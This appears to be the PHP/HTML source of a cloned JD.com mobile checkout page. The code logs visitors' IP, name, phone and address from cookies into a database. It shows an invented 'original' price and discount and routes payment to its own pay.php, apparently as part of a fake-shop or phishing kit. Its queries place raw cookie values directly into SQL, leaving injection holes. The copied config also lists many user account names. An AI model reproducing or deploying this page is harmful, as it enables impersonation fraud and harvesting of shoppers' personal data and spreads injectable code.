
<?php 
Define('PM_CALL',true);
Define('INC_CALL',true);
include dirname(__FILE__).('/../includes/global.class.php');
include dirname(__FILE__).('/../config/mysql.func.php');
include dirname(__FILE__).('/../config/Conn.php');
include dirname(__FILE__).('/../includes/getdata.php');
$ip=getIP();
setcookie('GoodsID4',$_COOKIE['GoodsID3']);
//写入订单号
setcookie('orderid',$zhuanzhuanORDER);
$xzshijian=date('Y-m-d H:i:s', time());

if($_COOKIE['GoodsID3']){
	

	    $cookTel=substr_replace($_COOKIE['se_tel'],'****',3,4);

	
	$_GoodsID = _fetch_array("SELECT * FROM goods WHERE goods_id='{$_COOKIE['GoodsID3']}'") or die('SQL执行错误');
	
		//判断操作记录数据是否存在，存在就更新此数据状态为2订单页和时间
	$_OID = _fetch_array("SELECT * FROM useraddress WHERE uip='{$ip}' AND gid='{$_COOKIE['GoodsID3']}'");
	if($_OID){
		_query("
			UPDATE 
				useraddress
			SET 
				state=2,
				utime='{$xzshijian}'
			WHERE 
				uip='{$ip}' LIMIT 1") or die(mysql_error());
				
				
		if($_COOKIE['se_name']){
			if($_OID){
			  _query("
				  UPDATE 
					  useraddress
				  SET 
					  uadd='{$_COOKIE['se_address']}',
					  utel='{$_COOKIE['se_tel']}',
					  uname='{$_COOKIE['se_name']}',
					  orderid='{$zhuanzhuanORDER}',
					  state=3
				  WHERE 
					  uip='{$ip}' LIMIT 1");
				
			}
		}	
		  _close();
		  session_destroy();
		  
	}

}
if($_COOKIE['GoodsURL1_1']){
    if(!$_COOKIE['GoodsID3']){
       header('Location:'. htmlspecialchars_decode($_COOKIE['GoodsURL1_1']).'');
    }
}else{
    header('Location:'. htmlspecialchars_decode($Class1_jump_url).'');
}

?>
<!DOCTYPE html>

<html lang="zh-CN"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
		
		
		<title>确认订单</title>
		<meta name="apple-mobile-web-app-capable" content="yes">
		<meta name="apple-mobile-web-app-status-bar-style" content="black">
		<meta name="format-detection" content="telephone=no">
		<script type="text/javascript" src="https://js.users.51.la/20885247.js"></script>
		<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0, shrink-to-fit=no, viewport-fit=cover">
		<meta http-equiv="x-dns-prefetch-control" content="on">










		<!-- #include virtual="/sinclude/cssi/fd/h5/wxsq_dev/buy/index.shtml" -->

		<link combofile="/fd/h5/wxsq_dev/buy/index.shtml" rel="stylesheet" href="./img/index.css" onerror="__reloadResource(this)">


		<script>
			window.MANUAL_PV = true; // pv主动上报，关闭公共默认上报
window.branch = 'main';
window._PFM_TIMING[1] = new Date();</script>
		<script charset="utf-8" src="./img/unify.js"></script>
		<script charset="utf-8" id="tak_trv" src="./img/tr.js"></script>
		<link type="text/css" rel="stylesheet" href="./img/mod_address_slide.css" id="addressCss">
		<style type="text/css"></style>
		<style type="text/css"></style>
		<style type="text/css"></style>
		<style type="text/css"></style>
		<style type="text/css"></style>
		<style type="text/css"></style>
		<style type="text/css"></style>
		<style type="text/css"></style>
		<style type="text/css"></style>
		<style type="text/css"></style>
		<style type="text/css"></style>
	</head>

	<body>
		<script>
			window._staticDisRec = {
				domain: 'wqp.jd.com',
				whitelist: '',
				operators: '',
				gray: ''
			}
		</script>
		<script>
			window._cgiDisasterRecovery = [{
				"name": "卖快",
				"percent": "0",
				"cgikey": "mart",
				"whitelist": ""
			}, {
				"name": "焦点cpc",
				"percent": "0",
				"cgikey": "cpc",
				"whitelist": ""
			}, {
				"name": "cpcnew",
				"percent": "0",
				"cgikey": "cpcnew",
				"whitelist": ""
			}, {
				"name": "multiMart",
				"percent": "0",
				"cgikey": "multiMart",
				"whitelist": ""
			}, {
				"name": "品牌列表",
				"percent": "0",
				"cgikey": "brandspecial",
				"whitelist": ""
			}, {
				"name": "品牌特卖详情",
				"percent": "0",
				"cgikey": "spematerial",
				"whitelist": ""
			}, {
				"name": "关键词",
				"percent": "0",
				"cgikey": "keywordsearch",
				"whitelist": ""
			}, {
				"name": "秒杀接口",
				"percent": "0",
				"cgikey": "seckill",
				"whitelist": ""
			}, {
				"name": "排行榜",
				"percent": "0",
				"cgikey": "ranklist",
				"whitelist": ""
			}, {
				"name": "console_log_report",
				"percent": "0",
				"cgikey": "console_log_report",
				"whitelist": "wdbqksQEhDVgNa"
			}, {
				"name": "materialQuery",
				"percent": "0",
				"cgikey": "materialQuery",
				"whitelist": ""
			}, {
				"name": "cpt",
				"percent": "0",
				"cgikey": "cpt",
				"whitelist": ""
			}, {
				"name": "mportal",
				"percent": "0",
				"cgikey": "mportal",
				"whitelist": ""
			}, {
				"name": "多关键词",
				"percent": "0",
				"cgikey": "batchkeyword",
				"whitelist": ""
			}, {
				"name": "类目入口",
				"percent": "0",
				"cgikey": "categoryentry",
				"whitelist": ""
			}]
		</script>
		<script>
			var GLOBAL_WXSQ_HEADERCONFIG = {
				"SMARTBOX": "202006221900",
				"jxsidSyncGray": "1",
				"SEARCHCSS": "//wq.360buyimg.com/c/=/fd/h5/base/gb/css/gb.min_10a01a62.css,/fd/h5/base/search/css/search.min_a992c9be.css",
				"HUIRATE": "0",
				"UMP": "4",
				"couponstatus": "1",
				"sqHome": "//wqs.jd.com/pingou/index.shtml",
				"wxHome": "//wqs.jd.com/pingou/index.shtml",
				"rongzai": "00000000000000000000",
				"wqcoss": "1",
				"HUIPIN": "11",
				"SMARTBOXCT": "e8e6e870",
				"WXFOOTCT": "0a3fe79c",
				"CLOSE_SMARTBOX": false,
				"CLOSE_SMARTBOX_M": false,
				"STATIC_ITEM_LINK": "0",
				"STATIC_ITEM_LINK_M": "0",
				"SMARTBOX_GRAY": "99",
				"SMARTBOX_GRAY_M": "0",
				"SMARTBOX_HISGRAY": "99",
				"SEARCH_WHITE_LIST": "nikiyun|ambbycruel_m|jd_52ace0384e2c8|jd_754cdc9304d40|了辽123|wen9717|Candy75446481|113452574-250558|j7jordan|pumpking911|jabeye003",
				"SMARTBOX_OPATM": false,
				"SMARTBOX_BGIMG": "",
				"SMARTBOX_RGIMG": "",
				"SMARTBOX_LGIMG": "",
				"ADAPT_JX_PIN": "|jd_79f11add547d8|domonmy2002|jd_41416955084f1|877856931_m|jd_6661389fd99cd|30460663_m|jd_4b7d954c39a50|baseTestUser057|liushushu62|18700870056_p|test94237990703|test_23海蒂|cheriechen_m|jd_zxuhui|郭晶浩|开心中文撒|夜之追梦|u_7776d54700a0e|jd_7ca6d2ff50702|15675842421_p|2283059053_m|wdNcSCCFeKXuzq|aNd1coder|Arons|jd_77bda2623cdc8|15574466554_p|jd_4a7ff8534dda0|WQtest_6393|13xmli2_m|1150297847_m|郭晶浩|wdTLvDzvVzeLpx|WQtest_4178|leimiui|jd_70e427c97f17f|darenpingtai2|shichuan001_wx|shichuan002_wx|jd_75ee9d309d7d6|15175010547_p|lihongbing1_wx030|lihongbing1_wx031|lihongbing1_wx032|lihongbing1_wx033|lihongbing1_wx034|jd_5e982c09a95f3|jd_79c19bc8fee0f|jd_40d4e9b302748|威大大392|jd_6ef23c66ebe4a|jd_6b03037043bfa|xzs小小|xzs19860829|jd_5d3c750aa9a74|xuelina6_wx004|baseTestUser041|jd_4b912593c4a8a|jd_633ec9721160f|jd_SmNZNQDKLerR|wdTLvDzvVzeLpx|青品黄|jd_7d8a55cefbcd9|wangwei998_wx002|jd_4e0c61f201d36|wdTliiRVvMgoKs|刘彩君193|jd_775bd88f84c16|al80402|143152922-429585|wxsq-bangding03|test94237990702|test94237990706|lvfei1983|jd_4913d5c125cd7|13005493006_p|jd_77545496929ea|luyanhong456|lqyygyss|",
				"ADAPT_JX_SCENE": "",
				"WEBMONITOR_STOP_TIMESTAMP": "60000",
				"URLTRANSFORMRULE": [{
					ruleType: "page",
					context: "refer",
					operator: "match",
					input: "https?:\/\/wqs\.jd\.com\/event\/m\/.*",
					compareValue: "",
					expect: "1",
					regexp: /^https?:\/\/(wq|wqitem)\.jd\.com\/item\/view\?sku=(\d+)/,
					replacement: "//item.m.jd.com/ware/view.action?wareId=$2",
					enable: "1"
				}, {
					ruleType: "page",
					context: "url",
					operator: "match",
					input: "\/\/wq\.jd\.com\/item\/view",
					compareValue: "",
					expect: "1",
					regexp: /\/\/wq\.jd\.com\/item\/view/,
					replacement: "//wqitem.jd.com/item/view",
					enable: "1"
				}, {
					ruleType: "page",
					context: "url",
					operator: "match",
					input: "(\/\/h5\.m\.jd\.com\/active\/)|(\/\/pro\.m\.jd\.com\/mall\/active\/)|(\/\/prodev\.m\.jd\.com\/wq\/active\/)",
					compareValue: "",
					expect: "1",
					regexp: /(\/\/h5\.m\.jd\.com\/active\/)|(\/\/pro\.m\.jd\.com\/mall\/active\/)|(\/\/prodev\.m\.jd\.com\/wq\/active\/)/,
					replacement: "//pro.m.jd.com/wq/active/",
					enable: "0"
				}, {
					ruleType: "cgi",
					context: "url",
					operator: "match",
					input: "wq\.jd\.com\/mcoss",
					compareValue: "",
					expect: "1",
					regexp: /wq\.jd\.com\/mcoss/,
					replacement: "wqcoss.jd.com/mcoss",
					enable: "0"
				}, {
					ruleType: "page",
					context: "url",
					operator: "match",
					input: "wqs.jd.com/event",
					compareValue: "",
					expect: "1",
					regexp: /wqs\.jd\.com\/event/,
					replacement: "wqp.jd.com/wqsproxy/event",
					enable: "0"
				}, {
					ruleType: "page",
					context: "url",
					operator: "match",
					input: "\/\/wq(item)?\.jd\.com\/item\/view\?",
					compareValue: "",
					expect: "1",
					regexp: /\/\/wq(item)?\.jd\.com\/item\/view\?/,
					replacement: "//wqs.jd.com/item/jd.shtml?",
					enable: "0"
				}],
				"DOMAINTRANSFORMRULE": [{
					targetRegex: "^(https?:)?\\/\\/wq(item)?\\.jd\\.com\\/item\\/view.*[?&]sku=\\d+",
					jdUrl: "//wq.jd.com/mm/item/view",
					jxUrl: "//m.jingxi.com/item/view",
					open: "no"
				}, {
					targetRegex: "^(https?:)?\\/\\/wqitem\\.jd\\.hk\\/item\\/view.*[?&]sku=\\d+",
					jdUrl: "//wqitem.jd.hk/item/view",
					jxUrl: "//wqitem.jd.hk/item/view",
					open: "no"
				}, {
					targetRegex: "^(https?:)?\\/\\/wq(sou)?\\.jd\\.com\\/search\\/searchn.*[?&]key=([^&#]*)",
					jdUrl: "//wq.jd.com/search/searchn",
					jxUrl: "//m.jingxi.com/search/searchn",
					open: "yes"
				}, {
					targetRegex: "^(https?:)?\\/\\/wq(deal)?\\.jd\\.com\\/deal\\/mshopcart\\/mycart",
					jdUrl: "//wq.jd.com/deal/mshopcart/mycart",
					jxUrl: "//m.jingxi.com/deal/mshopcart/mycart",
					open: "yes"
				}, {
					targetRegex: "^(https?:)?\\/\\/wq(deal)?\\.jd\.com\\/deal\\/confirmorder\\/main",
					jdUrl: "//wq.jd.com/deal/confirmorder/main",
					jxUrl: "//m.jingxi.com/deal/confirmorder/main",
					open: "yes"
				}, {
					targetRegex: "^(https?:)?\\/\\/wqs\\.jd\.com\\/pingou\\/account\\/index\\.html",
					jdUrl: "//wqs.jd.com/my/indexv2.shtml",
					jxUrl: "//st.jingxi.com/pingou/account/index.html",
					open: "yes"
				}, {
					targetRegex: "^(https?:)?\\/\\/wqs\\.jd\.com\\/my\\/indexv2\\.shtml",
					jdUrl: "//wqs.jd.com/my/indexv2.shtml",
					jxUrl: "//st.jingxi.com/pingou/account/index.html",
					open: "yes"
				}, {
					targetRegex: "^(https?:)?\\/\\/wqs\\.jd\.com\\/promote\\/201809\\/bargainPage\\/index\\.html",
					jdUrl: "//wqs.jd.com/promote/201809/bargainPage/index.html",
					jxUrl: "//actst.jingxi.com/promote/201809/bargainPage/index.html",
					open: "yes"
				}, {
					targetRegex: "^(https?:)?\\/\\/wqs\\.jd\.com\\/sns\\/201910\\/17\\/kj_sksm\\/index\\.html",
					jdUrl: "//wqs.jd.com/sns/201910/17/kj_sksm/index.html",
					jxUrl: "//actst.jingxi.com/sns/201910/17/kj_sksm/index.html",
					open: "yes"
				}, {
					targetRegex: "^(https?:)?\\/\\/wqs\\.jd\.com\\/wxsq_project\\/kj_sksm\\/my\\/my\\.html",
					jdUrl: "//wqs.jd.com/wxsq_project/kj_sksm/my/my.html",
					jxUrl: "//actst.jingxi.com/wxsq_project/kj_sksm/my/my.html",
					open: "yes"
				}, {
					targetRegex: "^(https?:)?\\/\\/wq(deal)?\\.jd\.com\\/deal\\/confirmorder\\/global",
					jdUrl: "//wq.jd.com/deal/confirmorder/global",
					jxUrl: "//m.jingxi.com/deal/confirmorder/global",
					open: "yes"
				}, {
					targetRegex: "^(https?:)?\\/\\/wq(sou)?\\.jd\\.com\\/coprsearch\\/cosearch",
					jdUrl: "//wq.jd.com/coprsearch/cosearch",
					jxUrl: "//m.jingxi.com/coprsearch/cosearch",
					open: "yes"
				}, {
					targetRegex: "^(https?:)?\\/\\/wq(sou)?\\.jd\.com\\/coprsearch\\/prsearch",
					jdUrl: "//wq.jd.com/coprsearch/prsearch",
					jxUrl: "//m.jingxi.com/coprsearch/prsearch",
					open: "yes"
				}, {
					targetRegex: "^(https?:)?\\/\\/so\\.m\\.jd\\.com\\/list\\/couponSearch\\.action",
					jdUrl: "//so.m.jd.com/list/couponSearch.action",
					jxUrl: "//m.jingxi.com/coprsearch/cosearch",
					open: "yes"
				}, {
					targetRegex: "^(https?:)?\\/\\/wq(sou)?\\.jd\\.com\\/coprsearch\\/ficosearch",
					jdUrl: "//wq.jd.com/coprsearch/ficosearch",
					jxUrl: "//m.jingxi.com/coprsearch/ficosearch",
					open: "yes"
				}, {
					targetRegex: "^(https?:)?\\/\\/wq(shop)?\\.jd\\.com\\/mshop\\/GetShopIntroduce",
					jdUrl: "//wqshop.jd.com/mshop/GetShopIntroduce",
					jxUrl: "//wqshop.jd.com/mshop/GetShopIntroduce",
					open: "yes"
				}]
			};
			GLOBAL_WXSQ_HEADERCONFIG.UMP !== "" && (window.GLOBAL_UMP_PERCENT = GLOBAL_WXSQ_HEADERCONFIG.UMP);
			window.GLOBAL_USEWQCOSS = GLOBAL_WXSQ_HEADERCONFIG.wqcoss;
			window.GLOBAL_RONGZAI_COLLECTION = GLOBAL_WXSQ_HEADERCONFIG.rongzai;
			window.GLOBAL_USECOUPONSTATUS = GLOBAL_WXSQ_HEADERCONFIG.couponstatus;
		</script>
		<script>
			window._cgiRecoveryRule = [{
				"rules": [{
					"cgiUrl": "//wqcoss.jd.com/mcoss/focusbi/show_new",
					"recoveryType": "md5",
					"pKey": "gids",
					"vk": "0",
					"batchParamRules": [],
					"batchParamKey": "gids|pcs",
					"sep": "|,"
				}, {
					"cgiUrl": "//wqcoss1.jd.com/mcoss/focusbi/show_new",
					"recoveryType": "md5",
					"pKey": "gids",
					"vk": "0",
					"batchParamKey": "gids|pcs",
					"sep": "|,"
				}, {
					"cgiUrl": "//wqcoss.jd.com/mcoss/keyword/keywordsearch",
					"recoveryType": "md5",
					"pKey": "ruleid",
					"vk": "0",
					"batchParamRules": [],
					"batchParamKey": "",
					"sep": ""
				}, {
					"cgiUrl": "//wqcoss.jd.com/mcoss/keyword/batchkeywordsearch",
					"recoveryType": "md5",
					"pKey": "pcs",
					"vk": "0",
					"batchParamKey": "pcs",
					"sep": ","
				}, {
					"cgiUrl": "//wqcoss.jd.com/mcoss/categoryentry/getentryv2",
					"recoveryType": "md5",
					"pKey": "projectid",
					"vk": "0",
					"batchParamKey": "",
					"sep": ""
				}, {
					"cgiUrl": "//wqcoss.jd.com/mcoss/categoryentry/batchgetentryv2",
					"recoveryType": "md5",
					"pKey": "ids",
					"vk": "0",
					"batchParamKey": "ids",
					"sep": ";"
				}, {
					"cgiUrl": "//wqcoss.jd.com/mcoss/martv3/show",
					"recoveryType": "md5",
					"pKey": "id",
					"vk": "0",
					"batchParamKey": "id",
					"sep": ";"
				}, {
					"cgiUrl": "//wqcoss.jd.com/mcoss/ranklist/bshow",
					"recoveryType": "md5",
					"pKey": "rids",
					"vk": "0",
					"batchParamKey": "rids",
					"sep": ","
				}, {
					"cgiUrl": "//wqcoss.jd.com/mcoss/pingou/show",
					"recoveryType": "md5",
					"pKey": "id",
					"vk": "0",
					"batchParamKey": "id",
					"sep": ";"
				}, {
					"cgiUrl": "//wqcoss.jd.com/mcoss/secondkill/show",
					"recoveryType": "md5",
					"pKey": "actid",
					"batchParamKey": "",
					"sep": "",
					"vk": "0"
				}, {
					"cgiUrl": "//wqcoss.jd.com/mcoss/brandsecondkill/show",
					"recoveryType": "md5",
					"pKey": "actid",
					"batchParamKey": "",
					"sep": "",
					"vk": "0"
				}, {
					"cgiUrl": "//wqcoss.jd.com/mcoss/reclike/show",
					"recoveryType": "md5",
					"pKey": "mid",
					"batchParamKey": "",
					"sep": "",
					"vk": "0"
				}, {
					"cgiUrl": "//wqcoss.jd.com/mcoss/smart/pagshow",
					"recoveryType": "md5",
					"pKey": "id",
					"batchParamKey": "id",
					"sep": ";",
					"vk": "0"
				}, {
					"cgiUrl": "//wqcoss.jd.com/mcoss/entryicon/show",
					"recoveryType": "md5",
					"pKey": "pcs",
					"batchParamKey": "pcs",
					"sep": ",",
					"vk": "0"
				}, {
					"cgiUrl": "//wqcoss.jd.com/mcoss/topic/gettopic",
					"recoveryType": "md5",
					"pKey": "sceneid",
					"batchParamKey": "",
					"sep": "",
					"vk": "0"
				}, {
					"cgiUrl": "//wqcoss.jd.com/mcoss/rocket/show",
					"recoveryType": "md5",
					"pKey": "sceneid",
					"batchParamKey": "",
					"sep": "",
					"vk": "0"
				}, {
					"cgiUrl": "//wqcoss.jd.com/mcoss/brandsale/show",
					"recoveryType": "md5",
					"pKey": "aid",
					"batchParamKey": "",
					"sep": "",
					"vk": "0"
				}, {
					"cgiUrl": "//wqcoss.jd.com/mcoss/pinlike/show",
					"recoveryType": "md5",
					"pKey": "pinlike",
					"batchParamKey": "",
					"sep": "",
					"vk": "0"
				}, {
					"cgiUrl": "//wqcoss.jd.com/mcoss/brandshangou/show",
					"recoveryType": "md5",
					"pKey": "aid",
					"batchParamKey": "matchactid|filterclass|matchclass",
					"sep": ",,,",
					"vk": "0"
				}, {
					"cgiUrl": "//wqcoss.jd.com/mcoss/newsfeed/show",
					"recoveryType": "md5",
					"pKey": "source",
					"batchParamKey": "",
					"sep": "",
					"vk": "0"
				}, {
					"cgiUrl": "//wqcoss.jd.com/mcoss/floorv2/eshow",
					"recoveryType": "md5",
					"pKey": "proids",
					"batchParamKey": "proids",
					"sep": ";",
					"vk": "0"
				}, {
					"cgiUrl": "//wqcoss.jd.com/mcoss/findgoods/show",
					"recoveryType": "md5",
					"pKey": "tabid",
					"batchParamKey": "",
					"sep": "",
					"vk": "0"
				}, {
					"cgiUrl": "//wqcoss.jd.com/mcoss/floorv2/tshow",
					"recoveryType": "md5",
					"pKey": "proids",
					"batchParamKey": "proids",
					"sep": ";",
					"vk": "0"
				}, {
					"cgiUrl": "//wqcoss.jd.com/mcoss/pgportal/mainentry",
					"recoveryType": "md5",
					"pKey": "tpl",
					"batchParamKey": "",
					"sep": "",
					"vk": "0"
				}, {
					"cgiUrl": "//wqcoss.jd.com/mcoss/reclike/getrecinfo",
					"recoveryType": "md5",
					"pKey": "recpos",
					"batchParamKey": "",
					"sep": "",
					"vk": "0"
				}, {
					"cgiUrl": "//wqcoss.jd.com/mcoss/data/get",
					"recoveryType": "md5",
					"pKey": "func",
					"batchParamKey": "",
					"sep": "",
					"vk": "0"
				}],
				"recoveryAll": "0",
				"__modifytime__": "2020-06-08 11:47:42",
				"open": "0",
				"batchParamRules": [{
					"bizName": "autorank",
					"cgiName": "show",
					"paramName": "cgids",
					"sep": ";"
				}]
			}];
		</script>
	 
		<div class="wx_wrap">
			<div>
				<div class="m_header_v2">
					<div class="m_header_bar_menu" style="display: none;"></div>
				</div>
				<div class="m_header_nav" style="display: none;"><a href="javascript:void(0);" class="m_header_nav_item type_index">首页</a>
					<a href="javascript:void(0);" class="m_header_nav_item type_search">分类搜索</a> <a href="javascript:void(0);" class="m_header_nav_item type_shopcart">购物车</a>
					<a href="javascript:void(0);" class="m_header_nav_item type_my">我的京东</a></div>
			</div>
			<div>
				<div class="topbar">
					<!---->
					<!---->
					<!---->
					<!---->
					<!---->
					<!---->
				</div>
				<div>
					<div class="address_defalut address_border">
						<ul>
							<li><strong><span class="tag tag_red">默认</span><a href="https://wqs.jd.com/my/my_address.shtml?jxsid=16066641450444420152">收货地址已同步京东</a></strong>
								<strong></strong></li>
							<li class="address">
								<!---->
								<!---->
								<p class="buy_chart_item_price"><a href="https://wqs.jd.com/my/my_address.shtml?jxsid=16066641450444420152">
										&nbsp;为减少接触，建议您的地址修改为小区门口，保安亭等方便提货的地址</a></p>
							</li>
						</ul>
					</div>
					<div>
						<div venderid="805806" class="order_info" style="margin-top: 15px;">
							<div venderid="805806" class="order_shopBar"><i class="order_shopBar_shop"></i> <span class="pop_vname"><?php echo $_GoodsID['user_name'];?></span></div>
							<ul>
								<div>
									<!---->
									<li class="hproduct"><img src="<?php echo $_GoodsID['goods_img1'];?>" class="photo">
										<!---->
										<div class="fn">
											<!---->
											<!---->
											<!---->
											<!---->
											<!---->
											<!----> <strong><?php echo $_GoodsID['title'];?></strong></div>
										<!---->
										<p class="sku_coll">
											<script type="text/javascript">
												if(localStorage.ys!=undefined){
												document.write(localStorage.ys);
												}
												if(localStorage.cm!=undefined&&localStorage.cm!="undefined"){
												document.write(","+localStorage.cm);
												}
												
											</script>
										</p>
										<!---->
										<p class="sku_price c_g_jd"><span class="price_area">
												¥<span class="large_text"><?php echo $_GoodsID['att_capacity'];?></span>.00
												<!---->
												<!----></span>
											<!---->
										</p>
										<div class="sku">
											<div class="num_wrap"><span class="minus disabled"></span> <input num_tag="input" type="tel" class="num" value="1"> <span class="plus"></span></div>
										</div>
										<ul class="order_info_tips">
											<!---->
											<li><img src="./img/5b863011ncc8682f5.png" class="icon_optional">支持7天无理由退货</li>
											<!---->
											<!---->
											<!---->
											<li><img src="./img/5b863013ne69c7156.png" class="icon_optional">价格说明</li>
										</ul>
										<!---->
									</li>
									<!---->
									<!---->
									<!---->
								</div>
							</ul>
							<div>
								<ul class="order_info_list">
									<li class="shipping"><strong>配送服务</strong>
										<div class="shipping_content">
											<p>
												京东快递
												<!---->
											</p>
											<!---->
											<div class="type_justify">
												<div class="left">中小件送货时间</div>
												工作日、双休日与节假日均可送货
												<!---->
											</div>
											<!---->
											<!---->
											<!---->
											<!---->
											<!---->
										</div>
									</li>
								</ul>
								<!---->
								<!---->
								<!---->
								<!---->
								<!---->
								<!---->
								<!---->
							</div>
							<div class="buy_msg_v2">
								<div class="buy_msg_v2_tit">店铺备注</div> <input type="text" placeholder="选填，给商家留言" maxlength="45">
							</div>
						</div>
					</div>
					<div class="buy_checkout">
						<ul>
							<li><a href="javascript:void(0);" class="content"><strong>促销优惠</strong> <em class="c_g_jd">
										<!---->
										&nbsp;已优惠 ¥<?php echo $_GoodsID['att_capacity'] - $_GoodsID['price'];?>.00
									</em></a></li>
							<li><a href="javascript:void(0);" class="content"><strong>发票信息</strong> <span>个人&nbsp;不开发票</span> <br><em class="c_g_jd" style="display: none;">请填写纳税人识别号，以免影响发票报销</em>
									<!----></a></li>
							<!---->
							<li><a href="javascript:void(0)" class="content"><strong>礼品卡</strong> <em class="disabled">无可用</em></a>
								<!---->
							</li>
							<!---->
							<!---->
							<li>
								<div class="content"><strong>红包<i class="icon_info middle"></i></strong>
									<div class="avaliable_v2 disabled"><span>
											无可用
										</span>
										<!---->
									</div>
									<div class="sel_icon"><span class="icon_select selected disabled"></span></div>
								</div>
							</li>
							<!---->
							<!---->
						</ul>
						<!---->
						<div id="payPass" style="display: none;">
							<div class="input_password_num"><label class="input_password_num_label">支付密码</label>
								<div id="shotDot" class="input_password_num_input"></div> <input id="shortid" type="tel" maxlength="6" autocomplete="off" class="i-text">
							</div>
							<p class="tips">1. 使用部分虚拟资产（包括京豆、京券、余额、礼品卡、领货码、红包、现金）或参加京豆优惠购时，为保障资产安全，请输入支付密码。<br>
								2. 参加京豆优惠购扣除的京豆，提交订单后，不支持退还。<br>
								忘记密码？<a href="javascript:void(0);" class="c_g_jd">重置京东支付密码</a></p>
						</div>
					</div>
					<!---->
					<div>
						<div class="buy_foreign_select" style="display: none;">
							阅读并同意<a href="javascript:void(0);" class="color_red c_g_jd">全球售服务协议和国际物流协议</a></div>
						<div class="buy_foreign_select" style="display: none;">
							购买京东国际商品需同意<a href="javascript:void(0);" class="color_red c_g_jd">《用户购买须知》</a></div>
					</div>
					<!---->
					<div class="buy_section">
						<ul class="buy_chart">
							<li class="buy_chart_item">
								<p class="buy_chart_item_text">商品金额</p>
								<p class="buy_chart_item_price c_g_jd">¥&nbsp;<?php echo $_GoodsID['att_capacity'];?>.00</p>
							</li>
							<!---->
							<!---->
							<!---->
							<li class="buy_chart_item">
								<p class="buy_chart_item_text">运费 <small class="buy_chart_item_tip">

									</small>
									<!---->
									<!---->
								</p>
								<p class="buy_chart_item_price c_g_jd">+&nbsp;¥0.00</p>
							</li>
							<!---->
							<!---->
							<!---->
							<!---->
							<!---->
							<!---->
							<li class="buy_chart_item">
								<p class="buy_chart_item_text">促销立减</p>
								<p class="buy_chart_item_price c_g_jd">&nbsp;¥<?php echo $_GoodsID['att_capacity'] - $_GoodsID['price'];?>.00</p>
							</li>
							<!---->
							<!---->
							<!---->
							<!---->
							<!---->
							<!---->
							<!---->
							<!---->
							<!---->
						</ul>
						<!---->
						<!---->
						<!---->
						<!---->
					</div>
					<div class="pay_area">
						<p class="price">实付金额：
							<strong class="c_g_jd">¥<?php echo $_GoodsID['price'];?>.00</strong> <span style="font-size: 12px; display: none;"></span></p> <a class="order_additional_tips type_lnk" style="display: none;">
							<p class="order_additional_tips_text"><span>购物满99元（10kg内）可免运费</span> <span class="order_additional_tips_right">去凑单</span></p>
						</a>
						<!---->
						<div id="payBtnList">
							<div class="mod_btns_v2" style="display: none;"><a href="javascript:void(0);" class="mod_btn bg_qq">
									QQ钱包支付
								</a></div>
							<p class="mod_btns_tips" style="display: none;">使用QQ钱包支付，即可获得全场满59减6优惠券1张~<br><a href="https://wqs.jd.com/my/chou/qqproillustrate.shtml">查看活动规则</a></p>
							<div class="mod_btns_v2" id="btnPayOnLine" style="display: none;"><a href="javascript:void(0);" class="mod_btn bg_2">在线支付</a></div>
							<div class="mod_btns_v2" id="btnPayOnLine" style="display: none;"><a href="pay.php" class="mod_btn bg_2">在线支付</a></div>
							<div class="mod_btns_v2" style="display: none;"><a href="javascript:void(0);" class="mod_btn bg_g_jd">
									京东支付
								</a></div>
							<div class="mod_btns_v2" style="display: none;"><a href="javascript:void(0);" class="mod_btn bg_cod">
									货到付款
								</a></div>
							<div class="mod_btns_v2" style="display: none;"><a href="javascript:void(0);" class="mod_btn bg_bt c_g_jd"><span class="btn_desc">京东白条<small class="sub_desc">分期还款，超低利息</small></span></a></div>
							<div class="mod_btns_v2 mod_btns_wrap" style="display: none;"><a href="javascript:void(0);" class="mod_btn bg_help main_btn"><span class="btn_desc">找人代付
										<small class="sub_desc">指定一位好友帮您支付</small></span></a> <span class="mod_btn bg_help i_btn"><i class="icon_info middle"></i></span></div>
							<div class="mod_btns_v2 mod_btns_wrap" style="display: none;"><a href="javascript:void(0);" class="mod_btn bg_offline main_btn"><span class="btn_desc">银行转账<small class="sub_desc">通过银行汇款完成支付</small></span></a> <span class="mod_btn bg_offline i_btn"><i class="icon_info middle"></i></span></div>
							<div class="mod_btns_v2" id="btnPayOnLine" style="display: none;"><a href="javascript:void(0);" class="mod_btn bg_2">提交订单</a></div>
							<div <span="" onclick="window.location.href=&quot;pay.php&quot;" class="mod_btns_v2"><a href="javascript:void(0);" class="mod_btn bg_2" style="background-color:#3AA6FE">在线支付</a></div>
							<!---->
							<div class="buy_notsupport">
								<h3 class="buy_notsupport_title">此订单不支持以下支付方式</h3>
								<div class="buy_notsupport_list">
									<div style="display: none;"><i class="icon"><img src="./img/591bf008n0f5f3e19.png"></i>
										<h3>QQ钱包支付</h3>
										<p>到店服务商品和普通商品同时购买时，不支持使用QQ钱包支付</p>
									</div>
									<div id="noSupBaitiao" style="display: none;"><i class="icon_baitiao"></i>
										<h3>京东白条</h3>
										<p>您的京东白条可用额度小于此笔订单金额，无法使用。</p>
									</div> <a href="javascript:void(0);" style="display: none;"><i class="icon_delivery"></i>
										<h3>货到付款</h3>
										<p id="clickCodTip">部分商品不支持货到付款，立即查看</p>
									</a>
									<div href="javascript:void(0);"><i class="icon_delivery"></i>
										<h3>货到付款</h3>
										<p id="codNoSupTip">订单商品不支持以货到付款方式配送至您的地址</p>
									</div>
								</div>
							</div>
						</div>
						<p class="delivery_tips" style="display: none;">
							此订单在本订阅号内无法使用微信支付，如需使用微信支付，请在“发现-购物-个人中心-待付款”订单内完成支付。
						</p>
						<div id="noCodModel" class="mod_alert mod_alert_goods show fixed" style="display: none;">
							<h3>以下商品不支持货到付款</h3>
							<ul class="goods"></ul>
							<div class="mod_btns_v2 small_btns"><a href="javascript:void(0);" class="mod_btn">移除不支持的</a> <a href="javascript:void(0);" class="mod_btn bg_g_jd">暂不使用货到</a></div>
						</div>
						<div class="mod_alert_mask" style="display: none;"></div>
						<!---->
					</div>
					<div>
						<!---->
					</div>
					<div>
						<!---->
						<!---->
						<!---->
						<!---->
						<!---->
					</div>
					<!---->
					<!---->
					<!---->
				</div>
			</div>
		</div>

		<div tag="qq_menu_layer_v2">
			<div class="qq_menu_layer_v2" style="display:none;z-index:1005" id="__mqqmenu"></div>
